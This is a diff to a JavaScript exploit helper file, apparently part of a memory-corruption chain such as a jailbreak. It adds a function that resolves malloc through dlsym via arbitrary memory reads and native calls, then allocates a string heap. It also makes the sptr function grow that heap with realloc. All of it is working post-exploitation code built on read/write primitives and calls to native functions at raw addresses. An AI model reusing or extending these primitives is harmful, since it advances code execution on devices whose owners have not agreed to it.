@@ -1,6 +1,8 @@
-var global_sptr_addy = 0x150000;
-var VECTOR_OFFSET = 0x10;
 var shit_status = 0x144444;
+var global_sptr_addy = 0;
+var VECTOR_OFFSET = 0x10;
+var sptr_size = 0;
+var sptr_len = 0;
 
 /*
  *  read uint8_t
@@ -151,11 +153,33 @@ function write_str(addy, s) {
 	return s;
 }
 
+function init_sptr_heap() {
+	var dlsym_addy = read_u32(reserve_addr + 24 + slid);
+	var shc_slide = read_u32(reserve_addr + 20 + slid);
+	write_str(0x150000, "malloc\0");
+	var addy = call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x150000, 0, 0);
+	global_sptr_addy = call4arg(addy, 0x1000000, 0, 0, 0);
+	sptr_size = 0x1000000;
+	sptr_len = 0;
+
+	calls4arg("printf\0", sptr("sptr_heap=%p\n\0"), global_sptr_addy, 0, 0);
+
+	return global_sptr_addy;
+}
+
 /*
  *  sptr is meant to give you a pointer to a specified string
  *  remember your nul's!
  */
 function sptr(s) {
+	if ((sptr_len + s.length) >= sptr_size) {
+		var dlsym_addy = read_u32(reserve_addr + 24 + slid);
+		var shc_slide = read_u32(reserve_addr + 20 + slid);
+		write_str(0x150000, "realloc\0");
+		var addy = call4arg(dlsym_addy + shc_slide, 0xfffffffe, 0x150000, 0, 0);
+		global_sptr_addy = call4arg(addy, global_sptr_addy, sptr_size + 0x100000, 0, 0);
+		sptr_size += 0x100000;
+	}
 	write_str(global_sptr_addy, s);
 	global_sptr_addy += s.length;
 	return global_sptr_addy - s.length;
